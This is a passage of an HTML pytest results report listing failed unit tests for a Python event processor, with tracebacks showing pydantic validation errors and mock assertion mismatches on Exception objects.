            <div class="log">self = &lt;test_event_processor.TestEventProcessor object at 0x7d1701592db0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_handle_besitos_awarded(self):<br/>        &quot;&quot;&quot;Test handling besitos awarded events.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Create a test event<br/>&gt;       event = create_event(<br/>            &quot;besitos_awarded&quot;,<br/>            user_id=&quot;12345&quot;,<br/>            amount=10,<br/>            reason=&quot;reaction_reward&quot;<br/>        )<br/><br/>tests/unit/test_event_processor.py:188: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>event_type = &#x27;besitos_awarded&#x27;<br/>kwargs = {&#x27;amount&#x27;: 10, &#x27;correlation_id&#x27;: &#x27;5729e549-2581-4e31-8b03-7cb336404c44&#x27;, &#x27;event_id&#x27;: &#x27;68fabd80-0e2d-44e3-9ec6-8b161d8a9302&#x27;, &#x27;event_type&#x27;: &#x27;besitos_awarded&#x27;, ...}<br/>uuid = &lt;module &#x27;uuid&#x27; from &#x27;/usr/lib/python3.12/uuid.py&#x27;&gt;<br/>datetime = &lt;class &#x27;datetime.datetime&#x27;&gt;<br/><br/>    def create_event(event_type: str, **kwargs) -&gt; BaseEvent:<br/>        &quot;&quot;&quot;Factory function to create event instances.<br/>    <br/>        Args:<br/>            event_type (str): Type of event to create<br/>            **kwargs: Event-specific parameters<br/>    <br/>        Returns:<br/>            BaseEvent: Created event instance<br/>    <br/>        Raises:<br/>            ValueError: If event_type is not supported<br/>        &quot;&quot;&quot;<br/>        if event_type not in EVENT_MODELS:<br/>            raise ValueError(f&quot;Unsupported event type: {event_type}&quot;)<br/>    <br/>        # Add common fields if not provided<br/>        if &quot;event_id&quot; not in kwargs:<br/>            import uuid<br/>            kwargs[&quot;event_id&quot;] = str(uuid.uuid4())<br/>    <br/>        if &quot;timestamp&quot; not in kwargs:<br/>            from datetime import datetime<br/>            kwargs[&quot;timestamp&quot;] = datetime.utcnow()<br/>    <br/>        if &quot;correlation_id&quot; not in kwargs:<br/>            import uuid<br/>            kwargs[&quot;correlation_id&quot;] = str(uuid.uuid4())<br/>    <br/>        # Ensure event_type is set<br/>        kwargs[&quot;event_type&quot;] = event_type<br/>    <br/>        # Create and return the event<br/>&gt;       return EVENT_MODELS[event_type](**kwargs)<br/><span class="error">E       pydantic_core._pydantic_core.ValidationError: 3 validation errors for BesitosAwardedEvent</span><br/><span class="error">E       source</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       balance_after</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       transaction_id</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><br/>src/events/models.py:480: ValidationError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_process_besitos_award</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b95e0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_process_besitos_award(self):<br/>        &quot;&quot;&quot;Test processing besitos award.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Create a test event<br/>&gt;       event = create_event(<br/>            &quot;besitos_awarded&quot;,<br/>            user_id=&quot;12345&quot;,<br/>            amount=10,<br/>            reason=&quot;reaction_reward&quot;<br/>        )<br/><br/>tests/unit/test_event_processor.py:282: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>event_type = &#x27;besitos_awarded&#x27;<br/>kwargs = {&#x27;amount&#x27;: 10, &#x27;correlation_id&#x27;: &#x27;3b2033cf-1c42-4acc-8060-10532f5dc937&#x27;, &#x27;event_id&#x27;: &#x27;9e2a8fbc-0b23-449b-9396-eef6afde27dc&#x27;, &#x27;event_type&#x27;: &#x27;besitos_awarded&#x27;, ...}<br/>uuid = &lt;module &#x27;uuid&#x27; from &#x27;/usr/lib/python3.12/uuid.py&#x27;&gt;<br/>datetime = &lt;class &#x27;datetime.datetime&#x27;&gt;<br/><br/>    def create_event(event_type: str, **kwargs) -&gt; BaseEvent:<br/>        &quot;&quot;&quot;Factory function to create event instances.<br/>    <br/>        Args:<br/>            event_type (str): Type of event to create<br/>            **kwargs: Event-specific parameters<br/>    <br/>        Returns:<br/>            BaseEvent: Created event instance<br/>    <br/>        Raises:<br/>            ValueError: If event_type is not supported<br/>        &quot;&quot;&quot;<br/>        if event_type not in EVENT_MODELS:<br/>            raise ValueError(f&quot;Unsupported event type: {event_type}&quot;)<br/>    <br/>        # Add common fields if not provided<br/>        if &quot;event_id&quot; not in kwargs:<br/>            import uuid<br/>            kwargs[&quot;event_id&quot;] = str(uuid.uuid4())<br/>    <br/>        if &quot;timestamp&quot; not in kwargs:<br/>            from datetime import datetime<br/>            kwargs[&quot;timestamp&quot;] = datetime.utcnow()<br/>    <br/>        if &quot;correlation_id&quot; not in kwargs:<br/>            import uuid<br/>            kwargs[&quot;correlation_id&quot;] = str(uuid.uuid4())<br/>    <br/>        # Ensure event_type is set<br/>        kwargs[&quot;event_type&quot;] = event_type<br/>    <br/>        # Create and return the event<br/>&gt;       return EVENT_MODELS[event_type](**kwargs)<br/><span class="error">E       pydantic_core._pydantic_core.ValidationError: 3 validation errors for BesitosAwardedEvent</span><br/><span class="error">E       source</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       balance_after</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><span class="error">E       transaction_id</span><br/><span class="error">E         Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;12345&#x27;, &#x27;amo...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]</span><br/><span class="error">E           For further information visit https://errors.pydantic.dev/2.9/v/missing</span><br/><br/>src/events/models.py:480: ValidationError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_add_to_dead_letter_queue_full</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b99d0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_add_to_dead_letter_queue_full(self):<br/>        &quot;&quot;&quot;Test adding events to full dead letter queue.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>        event_processor._max_dead_letter_queue_size = 2<br/>    <br/>        # Fill the queue<br/>        for i in range(3):<br/>&gt;           event = create_event(<br/>                f&quot;test_event_{i}&quot;,<br/>                user_id=&quot;12345&quot;<br/>            )<br/><br/>tests/unit/test_event_processor.py:338: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>event_type = &#x27;test_event_0&#x27;, kwargs = {&#x27;user_id&#x27;: &#x27;12345&#x27;}<br/><br/>    def create_event(event_type: str, **kwargs) -&gt; BaseEvent:<br/>        &quot;&quot;&quot;Factory function to create event instances.<br/>    <br/>        Args:<br/>            event_type (str): Type of event to create<br/>            **kwargs: Event-specific parameters<br/>    <br/>        Returns:<br/>            BaseEvent: Created event instance<br/>    <br/>        Raises:<br/>            ValueError: If event_type is not supported<br/>        &quot;&quot;&quot;<br/>        if event_type not in EVENT_MODELS:<br/>&gt;           raise ValueError(f&quot;Unsupported event type: {event_type}&quot;)<br/><span class="error">E           ValueError: Unsupported event type: test_event_0</span><br/><br/>src/events/models.py:461: ValueError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_processing_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;AsyncMock name=&#x27;_add_to_dead_letter_queue&#x27; id=&#x27;137537615939872&#x27;&gt;<br/>args = (SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestam...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>kwargs = {}<br/>expected = call(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, time...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>actual = call(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, time...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>_error_message = &lt;function NonCallableMock.assert_called_with.&lt;locals&gt;._error_message at 0x7d16d4c5f420&gt;<br/>cause = None<br/><br/>    def assert_called_with(self, /, *args, **kwargs):<br/>        &quot;&quot;&quot;assert that the last call was made with the specified arguments.<br/>    <br/>        Raises an AssertionError if the args and keyword args passed in are<br/>        different to the last call to the mock.&quot;&quot;&quot;<br/>        if self.call_args is None:<br/>            expected = self._format_mock_call_signature(args, kwargs)<br/>            actual = &#x27;not called.&#x27;<br/>            error_message = (&#x27;expected call not found.\nExpected: %s\n  Actual: %s&#x27;<br/>                    % (expected, actual))<br/>            raise AssertionError(error_message)<br/>    <br/>        def _error_message():<br/>            msg = self._format_mock_failure_message(args, kwargs)<br/>            return msg<br/>        expected = self._call_matcher(_Call((args, kwargs), two=True))<br/>        actual = self._call_matcher(self.call_args)<br/>        if actual != expected:<br/>            cause = expected if isinstance(expected, Exception) else None<br/>&gt;           raise AssertionError(_error_message()) from cause<br/><span class="error">E           AssertionError: expected call not found.</span><br/><span class="error">E           Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E             Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:944: AssertionError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;AsyncMock name=&#x27;_add_to_dead_letter_queue&#x27; id=&#x27;137537615939872&#x27;&gt;<br/>args = (SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestam...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>kwargs = {}<br/><br/>    def assert_called_once_with(self, /, *args, **kwargs):<br/>        &quot;&quot;&quot;assert that the mock was called exactly once and that that call was<br/>        with the specified arguments.&quot;&quot;&quot;<br/>        if not self.call_count == 1:<br/>            msg = (&quot;Expected &#x27;%s&#x27; to be called once. Called %s times.%s&quot;<br/>                   % (self._mock_name or &#x27;mock&#x27;,<br/>                      self.call_count,<br/>                      self._calls_repr()))<br/>            raise AssertionError(msg)<br/>&gt;       return self.assert_called_with(*args, **kwargs)<br/><span class="error">E       AssertionError: expected call not found.</span><br/><span class="error">E       Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E         Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E       </span><br/><span class="error">E       pytest introspection follows:</span><br/><span class="error">E       </span><br/><span class="error">E       Args:</span><br/><span class="error">E       assert (Subscription...&#x27;Test error&#x27;)) == (Subscription...&#x27;Test error&#x27;))</span><br/><span class="error">E         At index 1 diff: Exception(&#x27;Test error&#x27;) != Exception(&#x27;Test error&#x27;)</span><br/><span class="error">E         Use -v to get more diff</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:956: AssertionError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b9b20&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_handle_processing_failure(self):<br/>        &quot;&quot;&quot;Test handling processing failure.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        mock_event_bus.publish = AsyncMock()<br/>        mock_event_bus.is_connected = True<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Create a test event<br/>        event = create_event(<br/>            &quot;subscription_updated&quot;,<br/>            user_id=&quot;12345&quot;,<br/>            plan_type=&quot;premium&quot;,<br/>            status=&quot;active&quot;,<br/>            start_date=&quot;2025-01-15T00:00:00Z&quot;<br/>        )<br/>    <br/>        # Mock the add to dead letter queue method<br/>        with patch.object(EventProcessor, &#x27;_add_to_dead_letter_queue&#x27;) as mock_add_dlq:<br/>            mock_add_dlq.return_value = None<br/>    <br/>            await event_processor._handle_processing_failure(event, Exception(&quot;Test error&quot;))<br/>&gt;           mock_add_dlq.assert_called_once_with(event, Exception(&quot;Test error&quot;))<br/><span class="error">E           AssertionError: expected call not found.</span><br/><span class="error">E           Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E             Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;9e111ac8-33e7-4e77-8891-90303d5fa854&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 431081), correlation_id=&#x27;06f957aa-f854-43c1-82a0-7f9adcccd956&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E           </span><br/><span class="error">E           pytest introspection follows:</span><br/><span class="error">E           </span><br/><span class="error">E           Args:</span><br/><span class="error">E           assert (Subscription...&#x27;Test error&#x27;)) == (Subscription...&#x27;Test error&#x27;))</span><br/><span class="error">E             At index 1 diff: Exception(&#x27;Test error&#x27;) != Exception(&#x27;Test error&#x27;)</span><br/><span class="error">E             Use -v to get more diff</span><br/><br/>tests/unit/test_event_processor.py:386: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.processor:processor.py:496 Event processing failed: 9e111ac8-33e7-4e77-8891-90303d5fa854 - Test error<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_handle_processing_failure_publish_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;AsyncMock name=&#x27;_add_to_dead_letter_queue&#x27; id=&#x27;137537616803840&#x27;&gt;<br/>args = (SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestam...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>kwargs = {}<br/>expected = call(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, time...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>actual = call(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, time...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>_error_message = &lt;function NonCallableMock.assert_called_with.&lt;locals&gt;._error_message at 0x7d16d4c5c860&gt;<br/>cause = None<br/><br/>    def assert_called_with(self, /, *args, **kwargs):<br/>        &quot;&quot;&quot;assert that the last call was made with the specified arguments.<br/>    <br/>        Raises an AssertionError if the args and keyword args passed in are<br/>        different to the last call to the mock.&quot;&quot;&quot;<br/>        if self.call_args is None:<br/>            expected = self._format_mock_call_signature(args, kwargs)<br/>            actual = &#x27;not called.&#x27;<br/>            error_message = (&#x27;expected call not found.\nExpected: %s\n  Actual: %s&#x27;<br/>                    % (expected, actual))<br/>            raise AssertionError(error_message)<br/>    <br/>        def _error_message():<br/>            msg = self._format_mock_failure_message(args, kwargs)<br/>            return msg<br/>        expected = self._call_matcher(_Call((args, kwargs), two=True))<br/>        actual = self._call_matcher(self.call_args)<br/>        if actual != expected:<br/>            cause = expected if isinstance(expected, Exception) else None<br/>&gt;           raise AssertionError(_error_message()) from cause<br/><span class="error">E           AssertionError: expected call not found.</span><br/><span class="error">E           Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E             Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:944: AssertionError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;AsyncMock name=&#x27;_add_to_dead_letter_queue&#x27; id=&#x27;137537616803840&#x27;&gt;<br/>args = (SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestam...&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))<br/>kwargs = {}<br/><br/>    def assert_called_once_with(self, /, *args, **kwargs):<br/>        &quot;&quot;&quot;assert that the mock was called exactly once and that that call was<br/>        with the specified arguments.&quot;&quot;&quot;<br/>        if not self.call_count == 1:<br/>            msg = (&quot;Expected &#x27;%s&#x27; to be called once. Called %s times.%s&quot;<br/>                   % (self._mock_name or &#x27;mock&#x27;,<br/>                      self.call_count,<br/>                      self._calls_repr()))<br/>            raise AssertionError(msg)<br/>&gt;       return self.assert_called_with(*args, **kwargs)<br/><span class="error">E       AssertionError: expected call not found.</span><br/><span class="error">E       Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E         Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E       </span><br/><span class="error">E       pytest introspection follows:</span><br/><span class="error">E       </span><br/><span class="error">E       Args:</span><br/><span class="error">E       assert (Subscription...&#x27;Test error&#x27;)) == (Subscription...&#x27;Test error&#x27;))</span><br/><span class="error">E         At index 1 diff: Exception(&#x27;Test error&#x27;) != Exception(&#x27;Test error&#x27;)</span><br/><span class="error">E         Use -v to get more diff</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:956: AssertionError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015b9c70&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_handle_processing_failure_publish_exception(self):<br/>        &quot;&quot;&quot;Test handling processing failure with publish exception.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        mock_event_bus.publish = AsyncMock(side_effect=Exception(&quot;Publish error&quot;))<br/>        mock_event_bus.is_connected = True<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Create a test event<br/>        event = create_event(<br/>            &quot;subscription_updated&quot;,<br/>            user_id=&quot;12345&quot;,<br/>            plan_type=&quot;premium&quot;,<br/>            status=&quot;active&quot;,<br/>            start_date=&quot;2025-01-15T00:00:00Z&quot;<br/>        )<br/>    <br/>        # Mock the add to dead letter queue method<br/>        with patch.object(EventProcessor, &#x27;_add_to_dead_letter_queue&#x27;) as mock_add_dlq:<br/>            mock_add_dlq.return_value = None<br/>    <br/>            await event_processor._handle_processing_failure(event, Exception(&quot;Test error&quot;))<br/>&gt;           mock_add_dlq.assert_called_once_with(event, Exception(&quot;Test error&quot;))<br/><span class="error">E           AssertionError: expected call not found.</span><br/><span class="error">E           Expected: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E             Actual: _add_to_dead_letter_queue(SubscriptionUpdatedEvent(event_id=&#x27;33e5aa4e-e37f-4c58-b1a1-b3a42e10852a&#x27;, event_type=&#x27;subscription_updated&#x27;, timestamp=datetime.datetime(2025, 9, 20, 23, 26, 39, 609430), correlation_id=&#x27;70a7c38b-d0a9-4f39-8982-05ae5cb65d5e&#x27;, user_id=&#x27;12345&#x27;, payload={}, plan_type=&#x27;premium&#x27;, status=&#x27;active&#x27;, start_date=datetime.datetime(2025, 1, 15, 0, 0, tzinfo=TzInfo(UTC)), end_date=None), Exception(&#x27;Test error&#x27;))</span><br/><span class="error">E           </span><br/><span class="error">E           pytest introspection follows:</span><br/><span class="error">E           </span><br/><span class="error">E           Args:</span><br/><span class="error">E           assert (Subscription...&#x27;Test error&#x27;)) == (Subscription...&#x27;Test error&#x27;))</span><br/><span class="error">E             At index 1 diff: Exception(&#x27;Test error&#x27;) != Exception(&#x27;Test error&#x27;)</span><br/><span class="error">E             Use -v to get more diff</span><br/><br/>tests/unit/test_event_processor.py:411: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.events.processor:processor.py:496 Event processing failed: 33e5aa4e-e37f-4c58-b1a1-b3a42e10852a - Test error
ERROR    src.events.processor:processor.py:518 Failed to publish error event: Publish error<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_event_processor.py::TestEventProcessor::test_retry_dead_letter_queue_no_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
